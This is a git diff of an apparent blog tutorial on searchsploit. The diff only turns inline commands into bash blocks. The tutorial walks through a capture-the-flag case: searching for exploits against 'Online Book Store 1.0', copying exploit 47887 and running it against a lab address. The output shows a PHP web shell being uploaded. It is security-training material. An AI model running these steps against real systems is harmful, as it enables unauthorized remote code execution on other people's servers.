@@ -10,9 +10,8 @@ Usually this allows me to run the script. The two main ways I determine if a scr
 
 ## Usage
 
-Running `searchsploit -h` provided the following output:
-
 ```bash
+$ searchsploit -h
   Usage: searchsploit [options] term1 [term2] ... [termN]
 
 ==========
@@ -86,11 +85,8 @@ The following examples are ones that I have used in capture the flag exercises.
 
 I found a web application that was running the "Online Book Store v1.0" software. Using searchsploit I was able to find all kinds of vulnerabilities. Here is the command I ran to find what exploits were available:
 
-`searchsploit Online Book Store`
-
-The following was the output:
-
 ```bash
+$ searchsploit Online Book Store
 ------------------------------------------------------------------------------------------------ ---------------------------------
  Exploit Title                                                                                  |  Path
 ------------------------------------------------------------------------------------------------ ---------------------------------
@@ -106,11 +102,8 @@ Shellcodes: No Results
 
 The `Online Book Store 1.0 - Unauthenticated Remote Code Execution` line caught my eye. Looking in the Path column of the table, I see that `php/webapps/47887.py` is the file to run this exploit. I was to see more information about this exploit. I'll run the following command to get more information:
 
-`searchsploit 47887 -p`
-
-It output the following:
-
 ```bash
+$ searchsploit 47887 -p
 -------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                  |  Path
 -------------------------------------------------------------------------------- ---------------------------------
@@ -128,25 +121,28 @@ File Type: ASCII text
 
 The Path in the above output tells me where on my machine searchsploit is storing the exploit file. I can run the script in that directory or copy it over to my current directory. I usually copy it to my directory in case I need to make modifications or if I am including the script in a write up. I copy the script by running:
 
-`searchsploit 47887 -m`
+```bash
+$ searchsploit 47887 -m
+```
 
 The above command is the same as running the following:
 
-`cp /opt/exploitdb/exploits/php/webapps/47887.py .`
+```bash
+$ cp /opt/exploitdb/exploits/php/webapps/47887.py .
+```
 
 I try to run any python script with python3 because python 2 has been end of life since January 1st, 2020. This script would not work with python 2 since it uses the built in input command and that is handled slightly differently between python2 and python3.
 
 Now I run the command with the following:
 
-`python3 47887.py`
+```bash
+$ python3 47887.py
+```
 
 This generated an error saying that the script needs a url to be provided. So I included the root url to the application:
 
-`python3 47887.py http://10.10.1.1`
-
-This generated the output I was hoping for:
-
 ```bash
+$ python3 47887.py http://10.10.1.1
 > Attempting to upload PHP web shell...
 > Verifying shell upload...
 > Web shell uploaded to http://10.10.1.1/bootstrap/img/oUde8ShIJA.php
